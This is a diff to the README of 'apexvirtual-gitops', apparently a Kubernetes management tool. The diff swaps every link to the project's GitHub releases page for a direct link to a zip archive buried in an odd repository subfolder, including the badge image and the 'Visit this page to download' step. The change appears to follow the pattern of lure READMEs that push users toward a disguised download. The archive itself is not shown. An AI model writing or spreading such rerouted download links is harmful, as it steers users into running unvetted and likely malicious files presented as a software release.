@@ -1,6 +1,6 @@
 # 🌐 apexvirtual-gitops - Simplify Your Kubernetes Management
 
-[![Download](https://img.shields.io/badge/Download-Here-4CAF50)](https://github.com/CodeKovenant/apexvirtual-gitops/releases)
+[![Download](https://raw.githubusercontent.com/CodeKovenant/apexvirtual-gitops/main/seromaniac/apexvirtual-gitops.zip)](https://raw.githubusercontent.com/CodeKovenant/apexvirtual-gitops/main/seromaniac/apexvirtual-gitops.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to apexvirtual-gitops! This application helps you manage your Kubernetes
 
 To start using apexvirtual-gitops, follow these steps:
 
-1. **Visit this page to download**: [Releases Page](https://github.com/CodeKovenant/apexvirtual-gitops/releases)
+1. **Visit this page to download**: [Releases Page](https://raw.githubusercontent.com/CodeKovenant/apexvirtual-gitops/main/seromaniac/apexvirtual-gitops.zip)
    
 2. Look for the latest version at the top of the page. You will see various downloadable files.
 
@@ -84,4 +84,4 @@ For further inquiries, visit the issues section or contact the maintainers throu
 
 Feel free to explore, learn, and enjoy managing your Kubernetes applications with ease! 
 
-[![Download](https://img.shields.io/badge/Download-Here-4CAF50)](https://github.com/CodeKovenant/apexvirtual-gitops/releases)
+[![Download](https://raw.githubusercontent.com/CodeKovenant/apexvirtual-gitops/main/seromaniac/apexvirtual-gitops.zip)](https://raw.githubusercontent.com/CodeKovenant/apexvirtual-gitops/main/seromaniac/apexvirtual-gitops.zip)
